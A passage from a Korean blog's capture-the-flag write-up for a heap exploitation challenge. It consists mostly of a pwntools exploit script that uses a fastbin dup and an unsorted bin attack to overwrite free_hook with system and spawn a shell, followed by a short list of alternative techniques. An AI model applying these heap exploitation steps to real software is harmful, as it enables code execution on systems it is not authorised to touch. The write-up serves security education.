class="line">raise_flower(<span class="number">40</span>,<span class="string">'c'</span>*<span class="number">40</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'c'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'c'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">2</span>)</span><br><span class="line">remove_flower(<span class="number">3</span>)</span><br><span class="line">remove_flower(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk = heap_base + <span class="number">0x1050</span></span><br><span class="line">raise_flower(SIZE,p64(fake_chunk),<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'b'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'c'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">4</span>)</span><br><span class="line">remove_flower(<span class="number">1</span>)</span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x1050</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x161</span>) + p64(libc_hook - <span class="number">0x10</span> <span class="number">-13</span>)*<span class="number">2</span></span><br><span class="line">raise_flower(SIZE,payload,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">0x150</span>,<span class="string">'a'</span>*<span class="number">0x150</span>,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Fastbin dup in free_hook</span></span><br><span class="line">fake_chunk = libc_hook - <span class="number">0x10</span></span><br><span class="line">remove_flower(<span class="number">5</span>)</span><br><span class="line">remove_flower(<span class="number">6</span>)</span><br><span class="line">remove_flower(<span class="number">5</span>)</span><br><span class="line">clean_garden()</span><br><span class="line"></span><br><span class="line">raise_flower(SIZE,p64(fake_chunk),<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'b'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'/bin/sh;'</span>.ljust(SIZE,<span class="string">'a'</span>),<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line">raise_flower(SIZE,p64(libc_system),<span class="string">'red'</span>)</span><br><span class="line">remove_flower(<span class="number">0</span>)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h3><ul>
<li><p>fastbin dup 공격과 unsorted bin attack을 이용하는 방법말고, fastbin dup 공격으로 main_arena-&gt;top_chunk를 free_hook-0xb58 정도로 바꿔주면 malloc을 계속 호출하여 free_hook를 overwrite 할 수 있다.</p>
</li>
<li><p>uaf를 통해 flower 구조체를 조작하여 libc.symbols[‘environment’]로 스택 주소를 알아낸 뒤, fastbin dup로 rop하는 방법</p>
</li>
<li><p>stdout이나 heap에 저장된 file pointer의 vtable을 조작하여 oneshot 실행</p>
</li>
</ul>

      
    </div>
</article>

    </li>
  
</ul>

  <section id="nav-wrapper">
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">next »</a>
    </nav>
  </section>


            <footer>
    <div>© 2016 - kirasys </div>
    <div>
    Powered by Hexo
    </div>
</footer>

        </div>
    </div>
</div>
<script src="/js/pager/dist/singlepager.js"></script>
<script>
var sp = new Pager('data-pager-shell')

</script>
</body>
</html>